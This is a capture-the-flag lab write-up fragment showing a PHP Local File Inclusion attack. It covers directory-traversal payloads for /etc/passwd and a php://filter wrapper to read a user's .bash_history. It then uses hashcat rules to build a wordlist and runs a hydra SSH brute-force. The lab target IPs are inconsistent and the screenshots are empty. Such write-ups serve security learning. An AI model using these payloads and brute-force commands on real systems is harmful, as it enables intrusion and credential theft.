   
   
we notice that URL, so there is a parameter page, that includes html pages, and immediately when i saw that i thought of Local File Inclusion.  
so i tried some payloads like :  
- http://10.10.143.24/index.php?page=../../../etc/passwd  
- http://10.10.143.24/index.php?page=home.html../../../etc/passwd  
- http://10.10.143.24/index.php?page=....//....//....//etc/passwd  
but none of them worked, may be cause this app filters the parameter and prevent us from including the files using directory traversal.  
but there is another way, we can use PHP wrappers, also known as PHP stream wrappers, they are a feature in the PHP programming language that allows you to define custom protocols and handle I/O operations on various resources. In simple terms, PHP wrappers act as an abstraction layer between PHP code and different types of data sources or destinations.  
so we can get the content of a file encoded in base64 using this payload : php://filter/convert.base64-encode/resource=FILE_PATH.  
let's try it out :  
   
![](data:image/png;base64,)  
![](data:image/png;base64,)  
![](data:image/png;base64,)  
Modifying the URL, I navigated directly to [http://<><ip/index.php?page=php://filter/resource=/home/blue/.bash_history](http://10.10.89.175/index.php?page=php%3A%2F%2Ffilter%2Fresource%3D%2Fhome%2Fblue%2F.bash_history "http://10.10.89.175/index.php?page=php%3A%2F%2Ffilter%2Fresource%3D%2Fhome%2Fblue%2F.bash_history")  
![](data:image/png;base64,)  
Again lead  
![](data:image/png;base64,)  
**echo 'sup3r_p@s$w0rd!' > .reminder**  
**hashcat --stdout .reminder -r /usr/share/hashcat/rules/best66.rule > passlist.txt**  
   
** hydra -l blue -P passlist.txt ssh://10.49.137.38 -t 4 -f**  
   
   
![](data:image/png;base64,)
